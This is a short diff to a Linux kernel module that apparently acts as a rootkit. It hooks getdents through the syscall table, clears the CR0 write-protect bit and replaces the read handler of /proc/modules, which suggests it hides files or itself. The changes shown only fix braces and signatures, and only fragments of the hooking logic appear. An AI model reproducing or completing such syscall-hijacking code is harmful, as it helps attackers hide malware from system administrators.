@@ -60,7 +60,7 @@ asmlinkage int custom_getdents(unsigned int fd, struct dirent_  *entries, unsign
 		else {
 			boff += dEntryPtr->d_reclen;
 		}
-		
+	}		
 	return bytes_read;	
 }
 
@@ -90,7 +90,7 @@ ssize_t custom_proc(struct file *fp, char __user *buff, size_t len, loff_t *offs
   return ret;
 }
 
-__init int init_module() {
+int init_module(void) {
     printk(KERN_ALERT "Entering the init_module");
 
     p_sys_call_table = (void *) kallsyms_lookup_name("sys_call_table");
@@ -113,8 +113,7 @@ __init int init_module() {
     return 0;
 }
 
-void cleanup_module()
-{
+void cleanup_module(void) {
 
    	original_cr0 = read_cr0();
     	write_cr0(original_cr0 & ~0x00010000);
@@ -122,5 +121,5 @@ void cleanup_module()
     	p_sys_call_table[__NR_getdents] = (unsigned long *)original_getdents;
 	proc_modules_operations -> read = original_proc;
         write_cr0(original_cr0);	
-
+	
 }
